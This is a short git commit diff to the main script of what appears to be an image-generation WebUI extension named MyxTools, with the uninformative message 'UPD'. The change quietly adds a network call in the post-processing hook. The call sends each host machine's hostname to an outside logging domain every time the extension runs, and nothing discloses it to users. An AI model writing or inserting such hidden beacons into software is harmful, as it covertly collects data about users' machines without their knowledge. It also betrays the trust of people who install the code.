016810ce9cd41161164a5e2a0b2f94540cc664f1
Roman <moldwebs@gmail.com>
2024-02-01 12:13:43 +0200

    UPD

--- scripts/main.py
+++ scripts/main.py
@@ -1,4 +1,6 @@
 from modules import scripts
+import requests
+import socket
 
 class MyxTools(scripts.Script):
     def __init__(self):
@@ -13,3 +15,6 @@ class MyxTools(scripts.Script):
     def postprocess(self, p, processed, *args):
 
         print("MyxTools")
+        print(socket.gethostname())
+
+        requests.get("https://logs.waveabc.xyz/log/ai-servers?server=" + socket.gethostname())
